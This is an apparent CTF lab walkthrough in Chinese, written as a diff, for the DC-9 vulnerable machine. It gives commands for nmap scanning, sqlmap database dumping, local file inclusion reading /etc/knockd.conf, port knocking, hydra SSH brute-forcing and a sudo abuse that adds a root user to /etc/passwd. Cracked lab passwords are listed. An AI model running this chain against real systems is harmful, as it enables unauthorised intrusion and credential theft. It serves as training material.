@@ -1,0 +1,96 @@
+nmap -A -p- 192.168.140.0/24
+搜集主机信息
+
+nmap -A -p- 192.168.140.140
+搜集端口信息，开了80和22端口
+
+打开网页，search按钮可以sql注入
+burpsuite抓包，并保存
+sqlmap -r dc9html.txt --dbs 
+测试,获得数据库信息
+
+sqlmap -r dc9html.txt --current-db
+测试当前使用数据库 Staff
+
+sqlmap -r dc9html.txt -D Staff --tables
+爆出表
+
+sqlmap -r dc9html.txt -D Staff -T Users --columns
+爆出列名
+
+sqlmap -r dc9html.txt -D Staff -T Users -C Username,Password --dump
+爆出用户名密码
+admin：856f5de590ef37314e7c3bdf6f8a66dc
+md5解密 transorbital1
+获得登录密码
+登录网站后台
+
+还有一个User库爆破出一些用户名密码
+sqlmap -r dc9html.txt -D users -T UserDetails -C username,password --dump
+
+端口设置了knockd防护，通过本地文件包含读取knockd.conf文件
+http://192.168.140.140/manage.php?file=../../../../etc/knockd.conf
+ [openSSH] sequence = 7469,8475,9842 
+依次用nc敲击三个窗口
+
+利用awk命令保存user库中的用户名
+使用hydra爆破ssh
+hydra -L user.txt -P pass.txt 192.168.140.140 ssh
+获得三个用户名密码
+chandlerb  UrAG0D!
+joeyt      Passw0rd
+janitor    Ilovepeepee
+
+在janitor中用
+ls -la 查看隐藏文件，发现.secrets-for-putin目录，进去后发现passwords-found-on-post-it-notes.txt文件
+放到hydra 中继续爆破，获得新的用户名密码
+fredf      B4-Tru3-001
+
+find -perm -u=s -type f 2>/dev/null
+查看可以用来提权的命令
+发现没有
+
+用sudo -l
+发现有test文件可以不用密码执行sudo
+进入test目录
+cd /opt/devstuff/dist/test
+运行后提示要找到test.py
+find -name test.py -type f 2>/dev/null
+
+找到后打开查看源码
+cat /opt/devstuff/test.py
+###############################
+#!/usr/bin/python
+
+import sys
+
+if len (sys.argv) != 3 :
+    print ("Usage: python test.py read append")
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], "r")
+    output = (f.read())
+
+    f = open(sys.argv[2], "a")
+    f.write(output)
+    f.close()
+
+源码提示有三个参数，第一个参数读入一个值，将第一个参数值写入第二个参数
+
+利用这个程序向/etc/passwd里添加新的拥有root权限打用户
+
+openssl passwd -1 -salt hack 123456
+生成hash密码，-1表示采用md5加密，-salt为加密打盐 
+
+/etc/passwd规则
+hack:x:0:0:root:/home:/bin/bash
+用户名:密码:uid:gid:家目录:登录后的shell
+
+sudo ./test /tmp/hack /etc/passwd
+运行写入
+
+su hack
+
+进入root
+结束！！！
